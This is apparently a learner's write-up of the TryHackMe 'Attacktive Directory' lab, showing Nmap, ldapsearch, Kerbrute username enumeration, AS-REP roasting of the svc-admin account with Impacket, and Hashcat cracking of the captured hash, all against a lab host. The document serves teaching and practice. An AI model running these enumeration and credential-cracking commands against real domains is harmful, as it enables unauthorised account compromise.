# Attacktive Directory — TryHackMe

> Lab target IPs can change between sessions. The scan below used `10.145.149.203`; earlier commands in this writeup used `10.146.158.66`. Both refer to the same lab target in different sessions. When repeating the steps, use the IP assigned to the current session.

## 1. Port Scanning

I used Nmap with `-Pn` to identify open ports on the lab target. The `-Pn` option skips host discovery and treats the target as online. One of the ports I found was **389 (LDAP)**.

LDAP is used to query directory information, so I chose to investigate it for details about the target's domain.

### Scan Results (Later Session)

```text
Nmap scan report for 10.145.149.203
Host is up (0.039s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

The combination of Kerberos (`88`), LDAP (`389`), SMB (`445`), and Global Catalog (`3268`/`3269`) is consistent with an Active Directory domain controller. These services provide useful starting points for domain enumeration. The service names above are Nmap's port labels, not confirmed software versions.

> To add: the complete Nmap command. The confirmed option from the earlier scan is `-Pn`.

## 2. LDAP Enumeration

I used `ldapsearch` to query the LDAP service and found the following attribute:

```text
ldapServiceName: spookysec.local:attacktivedirec$@SPOOKYSEC.LOCAL
```

This gave me the following information:

| Value | Meaning |
| --- | --- |
| `spookysec.local` | Domain name |
| `attacktivedirec$` | Computer account name |
| `SPOOKYSEC.LOCAL` | Kerberos realm |

The domain name is useful for later domain enumeration and authentication-related commands.

### Command Used

```bash
ldapsearch -x -H ldap://10.146.158.66 -b "" -s base
```

- `-x`: use simple authentication instead of SASL; with no credentials supplied, this is an anonymous query.
- `-H`: specify the LDAP server URL.
- `-b ""`: use an empty search base to query the RootDSE.
- `-s base`: query only the base entry.

This queries the server’s RootDSE for basic directory information; it does not enumerate all domain users.

## 3. Username Enumeration with Kerbrute

I used Kerbrute with `userlist.txt`, a username wordlist provided by TryHackMe, to identify valid usernames in the `spookysec.local` domain.

Kerbrute checks candidate usernames through Kerberos. Finding valid usernames gives me accounts to investigate in the next steps.

### Interesting Results

The results included the following usernames:

```text
svc-admin@spookysec.local
backup@spookysec.local
Administrator@spookysec.local
administrator@spookysec.local
```

`Administrator` and `administrator` normally refer to the same AD account because usernames are case-insensitive.

The name `svc-admin` suggests a possible service account, but the name alone does not confirm its purpose or privileges.

`backup` is also worth investigating because its name suggests a backup-related account. Its group memberships and effective permissions still need to be checked; the name alone does not establish elevated access.

### Command Used

```bash
~/go/bin/kerbrute userenum -d spookysec.local --dc 10.146.158.66 userlist.txt -o valid-users.log
```

- `userenum`: enumerate valid usernames.
- `-d spookysec.local`: specify the target domain.
- `--dc 10.146.158.66`: specify the domain controller.
- `userlist.txt`: provide the candidate username wordlist.
- `-o valid-users.log`: save Kerbrute's log output to a file.

### Troubleshooting: Executable Path

I initially tried `./kerbrute`, but received `zsh: no such file or directory: ./kerbrute`. The `./` prefix refers to the current directory, while my Kerbrute executable was located in `~/go/bin/`.

I resolved this by running `~/go/bin/kerbrute` instead. I did not need to change directories because I supplied the executable's path.

## 4. AS-REP Roasting Check with GetNPUsers

I used Impacket's `GetNPUsers` to check whether any accounts in `userlist.txt` had Kerberos pre-authentication disabled.

For accounts with this setting, the domain controller can return an AS-REP without requiring the account's password. Part of that response can be used for offline password cracking. This technique is called **AS-REP Roasting**.

### Command Used

```bash
impacket-GetNPUsers -no-pass spookysec.local/ -usersfile userlist.txt -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
```

- `-no-pass`: do not prompt for a password.
- `spookysec.local/`: specify the target domain without supplying a username after the slash.
- `-usersfile userlist.txt`: check the candidate usernames in this file.
- `-dc-ip 10.146.158.66`: specify the domain controller's IP address.
- `-format hashcat`: format any collected AS-REP cracking material for Hashcat.
- `-outputfile asrep.txt`: save any collected AS-REP cracking material to this file.

### Targeted Check: svc-admin

Checking the entire `userlist.txt` was taking too long, so I switched to checking `svc-admin`, one of the valid usernames found with Kerbrute.

```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
```

Unlike the earlier command with `-usersfile`, this command targets a single account: `svc-admin`.

### Results

The command returned AS-REP cracking material for `svc-admin`:

```text
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<checksum>:<encrypted-data>
```

The checksum and encrypted data are abbreviated here for readability. The command uses `asrep.txt` as the output file for the full value.

This confirms that `svc-admin` has Kerberos pre-authentication disabled. I obtained an AS-REP hash suitable for offline password cracking, not the plaintext password. The subsequent cracking attempt is documented in Section 6.


## 5. Identifying the Hashcat Mode

After searching online, I identified the Hashcat mode for the collected AS-REP hash:

| Hashcat Mode | Hash Type |
| --- | --- |
| `18200` | Kerberos 5, etype 23, AS-REP |

The hash begins with `$krb5asrep$23$`, which matches this hash type. I will use mode `18200` when attempting to crack it with Hashcat.

The cracking command and result are documented in Section 6.

## 6. Offline Password Cracking with Hashcat

I cracked the AS-REP hash using Hashcat and `paswordlist.txt`, a password wordlist downloaded from TryHackMe. The filename below matches the file I used.

### Command Used

```bash
hashcat -m 18200 -a 0 asrep.txt paswordlist.txt
```

- `-m 18200`: select Kerberos 5, etype 23, AS-REP.
- `-a 0`: use a dictionary attack.
- `asrep.txt`: read the collected AS-REP hash.
- `paswordlist.txt`: supply candidate passwords.

### Results

Hashcat successfully recovered the password for `svc-admin`. The password is omitted from this published writeup.

```text
<AS-REP hash>:[REDACTED]
```

Hashcat does not modify the input file `asrep.txt` by default; it normally stores recovered results in its potfile. The trailing password in a `<hash>:<password>` result is not part of the original AS-REP hash.

This was an offline dictionary attack against the captured AS-REP material. The recovered password has not yet been validated against a domain service in this writeup.

## What I Learned

An open port helps me choose what to investigate next: port **389** suggested **LDAP**, and the LDAP response revealed the **domain name**.
